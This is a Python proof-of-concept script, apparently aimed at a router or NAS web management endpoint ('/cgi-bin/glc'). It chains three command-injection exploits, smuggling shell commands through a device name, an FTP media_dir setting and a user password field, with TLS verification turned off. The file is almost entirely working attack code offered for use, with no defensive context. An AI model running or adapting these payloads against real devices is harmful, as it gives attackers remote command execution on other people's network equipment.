# three exploits for this shit, need to clean up code

import json
import ssl
import sys
import time
import urllib.request

def create_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def glc_call(target, method, args, ctx):
    body = {"object": "nas-web", "method": method, "args": args}
    url = target.rstrip("/") + "/cgi-bin/glc"
    req = urllib.request.Request(
        url,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

def run_exploit1(target, ctx, cmd, outfile):
    prefix = "/" * 54 + "null"
    payload = f"$({cmd}>{outfile})"
    dev_name = prefix + payload
    status, body = glc_call(target, "eject_disk_do1", {"dev_name": dev_name}, ctx)
    print(f"Exploit 1 done. Status: {status}")
    print(f"    Verify: cat {outfile}")
    return status

def run_exploit2(target, ctx, cmd, outfile):
    media_dir = f"/x';{cmd}>{outfile} 2>&1;#"
    body_args = {
        "protos": [{"name": "ftp", "enable": 1, "media_dir": media_dir}]
    }
    status, body = glc_call(target, "set_proto_config", body_args, ctx)
    print(f"Exploit 2 done. Status: {status}")
    print(f"    Verify: cat {outfile}")
    return status

def run_exploit3(target, ctx, cmd, outfile):
    glc_call(target, "set_nas_ser", {"enable": 1}, ctx)
    glc_call(target, "start", {}, ctx)
    time.sleep(2)

    _, users_raw = glc_call(target, "get_user_list", {}, ctx)
    parts = users_raw.split(" ", 2)
    users_data = json.loads(parts[2] or "{}") if len(parts) >= 3 else {}
    users = users_data.get("list", [])

    if not users:
        print("    No NAS user found.")
        return None

    nas_user = users[-1]["name"]
    command = f"sh -c '{cmd}' > {outfile} 2>&1"
    nonce = str(time.time_ns())[-8:]
    password = f"Aa1!$({command}){nonce}"

    status, body = glc_call(target, "set_user_pwd", {"name": nas_user, "password": password}, ctx)
    print(f"Exploit 3 done. Status: {status}")
    print(f"    Verify: cat {outfile}")
    return status

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target>")
        sys.exit(1)

    target = sys.argv[1]
    cmd = "id"
    outfile_base = "/tmp/poc_output"

    ctx = create_ssl_ctx()
    print(f"Target: {target}")
    print()

    try:
        run_exploit1(target, ctx, cmd, outfile_base + "_1")
    except Exception as e:
        print(f"    Exploit 1 error: {e}")
    print()

    try:
        run_exploit2(target, ctx, cmd, outfile_base + "_2")
    except Exception as e:
        print(f"    Exploit 2 error: {e}")
    print()

    try:
        run_exploit3(target, ctx, cmd, outfile_base + "_3")
    except Exception as e:
        print(f"    Exploit 3 error: {e}")
    print()

    print(f"Done.")


if __name__ == "__main__":
    main()